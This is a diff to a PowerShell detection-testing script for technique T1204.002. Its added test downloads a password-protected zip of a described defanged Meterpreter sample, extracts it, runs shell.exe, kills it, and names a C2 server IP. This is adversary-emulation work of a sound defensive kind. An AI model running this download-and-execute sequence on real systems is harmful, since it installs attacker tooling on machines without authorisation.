@@ -62,7 +62,7 @@ function Run-AtomicTest1 {
     # Second URL to download (provide your own URL)
     $secondUrl = "YOUR_SECOND_URL_HERE"
 
-    $confirmation = Read-Host "Do you want to proceed with test 1? (Y/N)"
+    $confirmation = Read-Host "Do you want to proceed with T1204.002 : User Execution: Defanged malicious .lnk file? (Y/N)"
     if ($confirmation -ne "Y") {
             Write-Host "Exiting script..."
             return
@@ -127,9 +127,10 @@ function Run-AtomicTest2 {
     172.174.245.183. The C2 meterpreter listener is disabled by default on our C2 server. If
     execution succeeds, the C2 channel will not be established. 
     
-    If you would like to validate
-    the C2 server is non-operational prior to execution, you can perform the following test:
-    nmap -p 9191 172.174.245.183
+    If you would like to validate the C2 server is non-operational prior to execution, 
+    you can perform the following test:
+    
+        nmap -p 9191 172.174.245.183
     
     *Note: Other ports may be open as this C2 server is used for multiple engagements.
 
@@ -138,12 +139,12 @@ function Run-AtomicTest2 {
     "
     
     # First URL to download
-    $firstUrl = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
+    $firstUrl = "https://github.com/TRIFIDENT/ResponseValidation/raw/main/shell-trifident.zip"
     
     # Second URL to download (provide your own URL)
     $secondUrl = "YOUR_SECOND_URL_HERE"
 
-    $confirmation = Read-Host "Do you want to proceed with test 2? (Y/N)"
+    $confirmation = Read-Host "Do you want to proceed with Test 2: T1204.002 : User Execution: Defanged Malware: Meterpreter? (Y/N)"
     if ($confirmation -ne "Y") {
             Write-Host "Exiting script..."
             return
@@ -151,7 +152,7 @@ function Run-AtomicTest2 {
     
     try {
         # Try downloading the file from the first URL
-        Invoke-WebRequest -OutFile $env:Temp\test10.lnk $firstUrl -ErrorAction Stop
+        Invoke-WebRequest -OutFile $env:Temp\shell-trifident.zip $firstUrl -ErrorAction Stop
         Write-Host "File downloaded successfully from $firstUrl"
     }
     catch {
@@ -161,7 +162,7 @@ function Run-AtomicTest2 {
         
         try {
             # Try downloading the file from the second URL
-            Invoke-WebRequest -OutFile $env:Temp\test10.lnk $secondUrl -ErrorAction Stop
+            Invoke-WebRequest -OutFile $env:Temp\shell-trifident.zip $secondUrl -ErrorAction Stop
             Write-Host "File downloaded successfully from $secondUrl"
         }
         catch {
@@ -171,6 +172,50 @@ function Run-AtomicTest2 {
             return
         }
     }
+
+    # The zip file is password protected, we need 7zip to unpack it. If 7zip is not currently installed
+    # This script will remove it in the clean up section. (It will leave it if already installed)
+
+    # Check if 7Zip4Powershell module is installed
+    if (-not (Get-Module -Name 7Zip4Powershell -ListAvailable)) {
+        # If not installed, install the module
+        Install-Module -Name 7Zip4Powershell -Force
+        $Installed7Zip = $true
+    } else {
+        Write-Host "7Zip4Powershell module is already installed."
+        $Installed7Zip = $false
+    }
+
+    # If the module was installed or already installed, proceed with unzipping the file
+    if ($Installed7Zip -or (Get-Module -Name 7Zip4Powershell -ListAvailable)) {
+        $zipFile = "$env:Temp\shell-trifident.zip"
+        $destination = $env:Temp
+        $password = "trifident"
+        
+        # Unzip the file using 7Zip4Powershell
+        Expand-7ZipArchive -ArchiveFileName $zipFile -Password $password -TargetPath $destination -Force
+    } else {
+        Write-Host "Unable to unzip the file because the 7Zip4Powershell module is not available."
+    }
+    
+    # The test file has been saved to $temp\shell.exe
+    $file1 = "$env:Temp\shell.exe"
+    # Execute the downloaded file
+    Start-Process $file1
+
+    # Wait for 10 seconds
+    Start-Sleep -Seconds 10
+
+    # Kill the process named "a.exe"
+    taskkill /IM shell.exe /F
+
+    # Removing all downloaded or created files
+    $file1 = "$env:Temp\shell-trifident.zip"
+    $file2 = "$env:Temp\shell.exe"
+    Remove-Item $file1 -ErrorAction Ignore
+    Remove-Item $file2 -ErrorAction Ignore
+
+}
 
 # Call the function to display the logo and begin tests
 Show-Logo
